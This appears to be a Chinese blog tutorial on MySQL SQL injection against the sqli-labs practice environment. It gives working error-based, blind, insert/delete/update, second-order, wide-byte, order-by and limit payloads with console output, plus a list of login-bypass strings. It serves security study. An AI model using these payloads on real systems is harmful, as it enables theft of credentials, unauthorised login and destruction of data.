+&lt;p&gt;每个一个报错语句都有它的原理 比如  &lt;code&gt;exp()&lt;/code&gt;  报错的原理，手册说到 exp 是一个数学函数 取 e 的 x 次方，当我们输入的值大于 709 就会报错 然后～取反它的值总会大于 709 所以报错。&lt;/p&gt;
+&lt;p&gt;简单的用报错语句来注入一下把这里我就利用函数  &lt;code&gt;updatexml()&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;updatexml (XML_document, XPath_string, new_value); 
+XML_document: 是String格式，为XML文档对象的名称，文中为Doc 
+XPath_string : Xpath
+new_value :String格式，替换查找到的符合条件的数据 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中关键点就是 &lt;code&gt;XPath_string&lt;/code&gt;  这块了 因为我们传入的的不是 &lt;code&gt;XPath_string&lt;/code&gt; , 为什么要使用 &lt;code&gt;concat&lt;/code&gt;  这个函数呢，因为它是个连接函数你不用的话 &lt;code&gt;(updatexml(1,(select user()),1))&lt;/code&gt;  这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到 &lt;code&gt;concat&lt;/code&gt;  用特殊字符给他连接起来。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;爆库：
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +
+
+爆表：
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1) -- +
+
+爆字段：
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
+
+爆数据：
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在报错里面直接使用 MySQL 最基本的查表就可以了，你也可以把 concat 放在外面  &lt;code&gt;updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;自己灵活多变，这里我值得注意的是它加了连接字符 md5 只能爆出 31 位，你可以用分割函数分割出来。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;substr(string string,num start,num length);
+
+string为字符串
+
+start为起始位置
+
+length为长度
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为我密码不是 md5 的 所以我加了个密来分割。&lt;/p&gt;
+&lt;h1 id=&#34;0x00-盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-盲注&#34;&gt;#&lt;/a&gt; 0x00 盲注&lt;/h1&gt;
+&lt;p&gt;盲注我这里只归纳为&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;时间盲注&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;布尔盲注&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其实在如今的实际环境中一般盲注的情况毕竟多，时间盲注太费时间 同时对网络要求比较高，二分，dnslog, 等等可以加快注入的进程。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-盲注中值得注意的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-盲注中值得注意的问题&#34;&gt;#&lt;/a&gt; 0x01 盲注中值得注意的问题&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;盲注中使用 and 你得确定你查询的值得存在 。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在返回多组数据的情况下，你的延时不再是 单纯的  &lt;code&gt;sleep(5)&lt;/code&gt;  他将根据你返回的数据条数来反复执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在如同搜索型时尽量搜索存在且数目较少的关键词&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;尽量不要使用 or&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;至于以上为什么会出现这种原因 推荐大家看看 这篇文章讲的很清楚 https://www.t00ls.net/thread-45590-1-10.html&lt;/p&gt;
+&lt;h1 id=&#34;0x02-简单时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-简单时间盲注&#34;&gt;#&lt;/a&gt; 0x02 简单时间盲注&lt;/h1&gt;
+&lt;p&gt;时间盲注也叫延时注入 一般用到函数  &lt;code&gt;sleep()&lt;/code&gt;   &lt;code&gt;BENCHMARK()&lt;/code&gt;  还可以使用笛卡尔积 (尽量不要使用，内容太多会很慢很慢), 查阅 mysql 手册会发现很多东西&lt;/p&gt;
+&lt;p&gt;一般时间盲注我们还需要使用条件判断函数&lt;/p&gt;
+&lt;h2 id=&#34;if&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#if&#34;&gt;#&lt;/a&gt; if()&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;if（expre1，expre2，expre3）&lt;/code&gt;  当 expre1 为 true 时，返回 expre2，false 时，返回 expre3&lt;br /&gt;
+ 盲注的同时也配合着 mysql 提供的分割函，与正则函数 like 函数，比较函数等等，还是那句话多看手册。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;substr
+substring
+left
+......
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号 常用到的就有  &lt;code&gt;ascii()&lt;/code&gt;   &lt;code&gt;hex()&lt;/code&gt;  等等&lt;br /&gt;
+ &lt;code&gt;benchmark()&lt;/code&gt;  其作用是来测试一些函数的执行速度。benchmark () 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from users where id =1 and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1);
+Empty set (5.01 sec)
+
+mysql&amp;gt; select * from users where id =1 and if((substr((select user()),1,1)=&#39;r1&#39;),sleep(5),1);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select * from users where id =1 and if((substr((select user()),1,1)=&#39;r&#39;),BENCHMARK(20000000,md5(&#39;a&#39;)),1);
+Empty set (5.15 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;case-when-then-else-end&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#case-when-then-else-end&#34;&gt;#&lt;/a&gt; case when then else end&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from users where id =1 and case when (substr((select user()),1,1)=&amp;quot;rr&amp;quot;) then sleep(3) else 1 end;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select * from users where id =1 and case when (substr((select user()),1,1)=&amp;quot;r&amp;quot;) then sleep(3) else 1 end;
+Empty set (3.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不推荐使用笛卡尔积当数据过多时会造成 DOS。&lt;/p&gt;
+&lt;h1 id=&#34;0x03-布尔盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-布尔盲注&#34;&gt;#&lt;/a&gt; 0x03 布尔盲注&lt;/h1&gt;
+&lt;p&gt;盲注思路的思路很多 比如正则匹配，比较函数，运算符，推荐大家可以看看&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcwNjI2&#34;&gt; https://www.anquanke.com/post/id/170626&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;直接通过字符串截取对比，类似函数很多后面做个总结吧&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=1&#39; and substr((select user()),1,1)=&#39;r&#39; -- +
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;用  &lt;code&gt;IFNULL()&lt;/code&gt;  函数&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=1&#39; and IFNULL((substr((select user()),1,1)=&#39;r&#39;),0) -- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;使用 比较函数 &lt;code&gt;strcmp()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;1.
+
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and strcmp((substr((select user()),1,1)=&#39;r&#39;),1) -- +
+http://127.0.0.1/sqli/Less-1/?id=1&#39; and strcmp((substr((select user()),1,1)=&#39;r&#39;),0) -- +
+
+
+2.
+
+mysql&amp;gt; select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),&#39;o&#39;);
+Empty set (0.00 sec)
+
+mysql&amp;gt; select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),&#39;o&#39;);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x04-小技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x04-小技巧&#34;&gt;#&lt;/a&gt; 0x04 小技巧&lt;/h1&gt;
+&lt;p&gt;在没有办法的情况下必须使用到 or 的延时注入不如试试子查询，他也只将延时 5s&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39;  or if((substr((select user()),1,1)=&#39;r&#39;),((select sleep(5) from information_schema.schemata as b)),1);-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x00-insertdeleteupdate-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-insertdeleteupdate-注入&#34;&gt;#&lt;/a&gt; 0x00 insert,delete,update 注入&lt;/h1&gt;
+&lt;p&gt;insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，和其他情况。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-insertdeleteupdate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-insertdeleteupdate&#34;&gt;#&lt;/a&gt; 0x01 insert,delete,update&lt;/h1&gt;
+&lt;h2 id=&#34;insert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#insert&#34;&gt;#&lt;/a&gt; insert&lt;/h2&gt;
+&lt;p&gt;可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。&lt;/p&gt;
+&lt;p&gt;一般这种注入会出现在 注册、ip 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;报错&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; insert into admin (id,username,password) values (2,&amp;quot;or updatexml(1,concat(0x7e,(version())),0) or&amp;quot;,&amp;quot;admin&amp;quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&amp;gt; select * from admin;
++------+-----------------------------------------------+----------+
+| id   | username                                      | password |
++------+-----------------------------------------------+----------+
+|    1 | admin                                         | admin    |
+|    1 | and 1=1                                       | admin    |
+|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
++------+-----------------------------------------------+----------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; insert into admin (id,username,password) values (2,&amp;quot;&amp;quot;or updatexml(1,concat(0x7e,(version())),0) or&amp;quot;&amp;quot;,&amp;quot;admin&amp;quot;);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;盲注&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;int 型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1),&#39;1&#39;,&amp;quot;admin&amp;quot;);
+Query OK, 1 row affected (5.00 sec)
+
+mysql&amp;gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1),&#39;1&#39;,&amp;quot;admin&amp;quot;);
+Query OK, 1 row affected (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;字符型注意闭合不能使用 and&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1)+&#39;&#39;,&amp;quot;admin&amp;quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&amp;gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)+&#39;&#39;,&amp;quot;admin&amp;quot;);
+Query OK, 1 row affected (5.01 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意盲注产生大量垃圾数据。&lt;/p&gt;
+&lt;h2 id=&#34;delete&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#delete&#34;&gt;#&lt;/a&gt; delete&lt;/h2&gt;
+&lt;p&gt;报错注入同上&lt;/p&gt;
+&lt;p&gt;值得注意的时 delete 注入很危险，很危险，很危险。&lt;/p&gt;
+&lt;p&gt;语句不当 将会亲人泪两行  &lt;code&gt;or 1=1&lt;/code&gt;  因为 1=1 为 true 所以每一行被删除了，他以前用 sqlmap 一把梭 现在过的很好，每顿都有人送饭到手上。&lt;/p&gt;
+&lt;p&gt;所以在 delete 注入时使用 or 一定要为 false&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; delete from admin where id =3 or 1=1;
+Query OK, 4 rows affected (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;报错注入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;盲注&lt;/p&gt;
+&lt;p&gt;or 配上  &lt;code&gt;if()&lt;/code&gt;  函数使用不当 再提下 if (expr1,expr2,expr3)，如果 expr1 的值为 true，返回 expr2 的值，如果 expr1 的值为 false，&lt;br /&gt;
+返回 expr3 的值。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r4&#39;),sleep(5),1);
+Query OK, 3 rows affected (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;所以 delete 中 or 的正确使用方法 (or 右边要为 false)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r4&#39;),sleep(5),0);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&amp;gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0);
+Query OK, 0 rows affected (5.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;update&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#update&#34;&gt;#&lt;/a&gt; update&lt;/h2&gt;
+&lt;p&gt;与上面的类似&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | admin    | admin    |
++------+----------+----------+
+4 rows in set (0.00 sec)
+
+mysql&amp;gt; update admin set id=&amp;quot;5&amp;quot;+sleep(5)+&amp;quot;&amp;quot; where id=2;
+Query OK, 4 rows affected (20.00 sec)
+Rows matched: 4  Changed: 4  Warnings: 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x02-文末-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-文末-2&#34;&gt;#&lt;/a&gt; 0x02 文末&lt;/h1&gt;
+&lt;p&gt;update，insert 注入怎么找，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入&lt;/p&gt;
+&lt;h1 id=&#34;0x00-二次注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-二次注入&#34;&gt;#&lt;/a&gt; 0x00 二次注入&lt;/h1&gt;
+&lt;p&gt;二次注入的原理是 sql 语句没有被转义直接存入数据库，然后在被读取查询而导致的。&lt;/p&gt;
+&lt;p&gt;二次注入在 php 种通常见于，插入时被 &lt;code&gt;addslashes()&lt;/code&gt;   &lt;code&gt;get_magic_quotes_gpc&lt;/code&gt;  等等转义，但是写入数据库时还是使用原来的数据，二次注入造成原因时多种多样的。&lt;/p&gt;
+&lt;p&gt;在没有被单引号包裹的 sql 语句下，我们可以用 16 进制编码他，这样就不会带有单引号等。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; insert into admin (id,name,pass) values (&#39;3&#39;,0x61646D696E27313131,&#39;11&#39;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&amp;gt; select * from admin;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin&#39;111 | 11111 |
+|  3 | admin&#39;111 | 11    |
++----+-----------+-------+
+4 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;想要具体了解这个 大家可以做做 sqli-labs 24 课，二次注入在没有源码的情况比较难发现，通常见于注册，&lt;/p&gt;
+&lt;h1 id=&#34;0x01-宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-宽字节注入&#34;&gt;#&lt;/a&gt; 0x01 宽字节注入&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;1.没使用宽字节
+%27 -&amp;gt; %5C%27
+
+2. 试用宽字节
+
+%df%27 -&amp;gt; %df%5c%27 -&amp;gt; 運&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;在我们输入单引号时  &lt;code&gt;addslashes()&lt;/code&gt;  或者 &lt;code&gt;get_magic_quotes_gpc&lt;/code&gt;  给我们的单引号加入了转义字符 &lt;code&gt;\&lt;/code&gt;  就变成了 &lt;code&gt;\&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;我们输入经过转换后由于编码的不同把 &lt;code&gt;%df%5c&lt;/code&gt;  转换为了一个汉字。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;想要具体了解找个的可以 做做 sqli-labs 33 课&lt;/p&gt;
+&lt;h1 id=&#34;0x00-order-by-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-order-by-注入&#34;&gt;#&lt;/a&gt; 0x00 order by 注入&lt;/h1&gt;
+&lt;p&gt;这是一种特殊的注入 sql 语句为  &lt;code&gt;select * from admin order by $id&lt;/code&gt;  我们一般用 order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。&lt;/p&gt;
+&lt;p&gt;order by 注入是不能 直接使用 &lt;code&gt;and 1=1&lt;/code&gt;  来判断的，他需要用到条件语句。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin order by id;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; select * from admin order by username;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#盲注&#34;&gt;#&lt;/a&gt; 盲注&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;布尔&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;简单的判断&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin order by if(1=1,username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; select * from admin order by if(1=3,username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;简单的注入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin order by if((substr((select user()),1,1)=&#39;r1&#39;),username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql&amp;gt; select * from admin order by if((substr((select user()),1,1)=&#39;r&#39;),username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+
+http://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)=&#39;r&#39;),username,password)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;时间盲注&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;时间盲注不能直接简单的 &lt;code&gt;sleep()&lt;/code&gt;  因为他会对每条内容来执行你的语句，所以会造成 dos 测试获取速度慢等问题，这时候我们需要用到子查询&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin order by if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
+|    2 | admin    | ddmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (15.01 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们写一条简单的子查询试试&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin order by if((substr((select user()),1,1)=&#39;r&#39;),(select 1 from (select sleep(2)) as b),password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    3 | bdmin    | fdmin    |
+|    2 | admin    | ddmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (2.01 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)
+
+mysql&amp;gt; select * from admin order by (extractvalue(1,concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x01-from&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-from&#34;&gt;#&lt;/a&gt; 0x01 From&lt;/h1&gt;
+&lt;p&gt;from 后面的注入比较少 还是提一下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from $id;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;可以结合 order by 来注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以使用联合注入来注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin union select 1,user(),3;
++------+----------------+----------+
+| id   | username       | password |
++------+----------------+----------+
+|    3 | bdmin          | fdmin    |
+|    2 | admin          | ddmin    |
+|    1 | cdmin          | bdmin    |
+|    1 | root@localhost | 3        |
++------+----------------+----------+
+4 rows in set (0.02 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;方法跟普通注入一样的一样自己加上表名&lt;/p&gt;
+&lt;h1 id=&#34;0x02-limit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-limit&#34;&gt;#&lt;/a&gt; 0x02 limit&lt;/h1&gt;
+&lt;p&gt;这种注入也不是很常见，依照 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXRlaXAuY29tL2Jsb2cvc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLw==&#34;&gt;https://rateip.com/blog/sql-injections-in-mysql-limit-clause/&lt;/span&gt; 来提一下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where id &amp;gt;0 limit 0,1 $id
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如何利用呢 大佬们已经给出方法了 用  &lt;code&gt;PROCEDURE ANALYSE&lt;/code&gt;  配合报错注入，所以多看文档，如果你想提升下自己的水平&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where id &amp;gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;
+ERROR:
+No query specified
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里延时只能使用 &lt;code&gt;BENCHMARK()&lt;/code&gt;  如同&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from admin where id &amp;gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x00-再谈万能密码登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-再谈万能密码登陆&#34;&gt;#&lt;/a&gt; 0x00 再谈万能密码登陆&lt;/h1&gt;
+&lt;p&gt;万能密码基本大家都用过，各种各样的，如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39;or 1=1/*
+&amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a
+&amp;quot;or 1=1--
+&amp;quot;or&amp;quot;=&amp;quot;
+&amp;quot;or&amp;quot;=&amp;quot;a&#39;=&#39;a
+&amp;quot;or1=1--
+&amp;quot;or=or&amp;quot;
+&#39;&#39;or&#39;=&#39;or&#39;
+&#39;) or (&#39;a&#39;=&#39;a
+&#39;.).or.(&#39;.a.&#39;=&#39;.a
+&#39;or 1=1
+&#39;or 1=1--
+&#39;or 1=1/*
+&#39;or&amp;quot;=&amp;quot;a&#39;=&#39;a
+&#39;or&#39; &#39;1&#39;=&#39;1&#39;
+&#39;or&#39;&#39;=&#39;
+&#39;or&#39;&#39;=&#39;&#39;or&#39;&#39;=&#39;
+&#39;or&#39;=&#39;1&#39;
+&#39;or&#39;=&#39;or&#39;
+&#39;or.&#39;a.&#39;=&#39;a
+&#39;or1=1--
+1&#39;or&#39;1&#39;=&#39;1
+a&#39;or&#39; 1=1--
+a&#39;or&#39;1=1--
+or &#39;a&#39;=&#39;a&#39;
+or 1=1--
+or1=1--
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，&lt;/p&gt;
+&lt;p&gt;这里面涉及到运算符的优先级，MySQL 运算的特性，然后下面我们以几个例子来做做最另类的万能密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where name = &#39;/*&#39; and pass = &#39;*/&#39;;
+Empty set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注释绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from admin where name = &#39;&#39;or 1=1-- &#39; and pass = &#39;123&#39;;
+    -&amp;gt; ;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin&#39;111 | 11111 |
+|  3 | admin&#39;111 | 11    |
+|  4 | admin&#39;111 | 11    |
